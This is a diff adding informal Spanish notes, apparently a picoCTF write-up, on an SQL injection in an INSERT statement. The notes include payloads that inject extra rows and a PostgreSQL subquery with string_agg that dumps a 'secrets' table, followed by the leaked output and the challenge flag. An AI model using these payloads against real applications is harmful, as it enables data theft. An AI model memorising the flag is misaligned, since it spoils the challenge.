@@ -1,0 +1,26 @@
+bueno se me borro todo lo anterior pero encontramos que si ingresamos '
+nos da un error y vamos a ver un uuid en la consulta ese es el owner_id que es absolutamente necesario
+y en la misma consulta podemos ingresar dos secretos al mismo tiempo haciendo
+
+asddasd'), ('TU_OWNER_ID', 'contenidodelsegundocoso
+
+para que hacemos esto? si revisamos el codigo de la aplicacion nos damos cuenta que precisamente hay una tabla que se llama secrets en donde estan todos los secretos
+y queremos imprimir todo eso en una sola linea porque si intentamos hacerlo con mas lineas vamos a obtener un error
+
+ENTONCES lo que queremos es con un select imprimir todo el contenido de secrets pero en una sola linea
+
+en ESTE EJEMPLO mi owner id es el siguiente
+asddasd'), ('bb994990-7ee0-48ee-ac66-8bf720368515', 'contenidodelsegundocoso
+
+luego intentamos con otro payload
+
+asddasd'), ('bb994990-7ee0-48ee-ac66-8bf720368515', (SELECT string_agg(s::text, '') FROM secrets s) || 'asdasd
+ojo esto es sintax de posgre sql en mysql seria algo como
+
+string_agg aca es como decir "Che, agarrame CADA FILA ENTERA de la tabla 's', convertí todos sus campos a texto, y pegamelas TODAS JUNTAS una al lado de la otra separadas por '' de por medio."
+
+vas a ver algo asi
+
+(2672ee17-1558-4f73-aa52-462e682dcd35,e2a66f7d-2ce6-4861-b4aa-be8e069601cb,picoCTF{sq1_1nject10n_31c1577b},"2026-09-13 20:20:35.889425+00")(31750eca-d2dc-4bfb-a722-7274d1d7a9c3,bb994990-7ee0-48ee-ac66-8bf720368515,asddasd,"2026-09-13 20:21:18.871401+00")(4ce90532-3d33-44aa-9cdc-02e786e019ba,bb994990-7ee0-48ee-ac66-8bf720368515,contenidodelsegundocoso,"2026-09-13 20:21:18.871401+00")(95ab85ad-e295-4033-a469-8bc1dde31979,bb994990-7ee0-48ee-ac66-8bf720368515,asddasd,"2026-09-13 20:23:54.26033+00")(33dcbff1-820a-473d-9334-17748ef4cdc1,bb994990-7ee0-48ee-ac66-8bf720368515,"[{""id"":""2672ee17-1558-4f73-aa52-462e682dcd35"",""owner_id"":""e2a66f7d-2ce6-4861-b4aa-be8e069601cb"",""content"":""picoCTF{sq1_1nject10n_31c1577b}"",""created_at"":""2026-09-13T20:20:35.889425+00:00""}, {""id"":""31750eca-d2dc-4bfb-a722-7274d1d7a9c3"",""owner_id"":""bb994990-7ee0-48ee-ac66-8bf720368515"",""content"":""asddasd"",""created_at"":""2026-09-13T20:21:18.871401+00:00""}, {""id"":""4ce90532-3d33-44aa-9cdc-02e786e019ba"",""owner_id"":""bb994990-7ee0-48ee-ac66-8bf720368515"",""content"":""contenidodelsegundocoso"",""created_at"":""2026-09-13T20:21:18.871401+00:00""}]asdasd","2026-09-13 20:23:54.26033+00")asdasd 
+
+picoCTF{sq1_1nject10n_31c1577b}
